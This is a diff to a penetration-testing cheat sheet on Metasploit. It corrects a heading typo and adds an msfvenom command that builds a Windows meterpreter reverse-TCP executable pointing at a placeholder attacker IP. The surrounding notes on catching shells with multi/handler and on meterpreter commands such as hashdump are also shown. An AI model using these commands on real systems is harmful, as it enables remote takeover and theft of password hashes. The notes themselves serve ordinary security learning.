@@ -16,12 +16,14 @@
 - Language you need (Python, PHP, ...)
 - Netwok connection types (TCP, HTTPS,...) 
 
-### Cath the shell
+### Catch the shell
+
 `use exploit/multi/handler`
 If you want meterpreter commands choose type of payload with meterpreter
 Set `LHOST` and `LPORT` and `run` to catch the shell
 
 ### Meterpreter Commands
+
 You can see this when typing `help`
 ```
 meterpreter > help
@@ -111,6 +113,10 @@ hashdump: Dumps the contents of the SAM database
 ```
 
 ### Example of shells
+
+#### EXE shell
+
+- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe`
 
 #### Using powershell
 
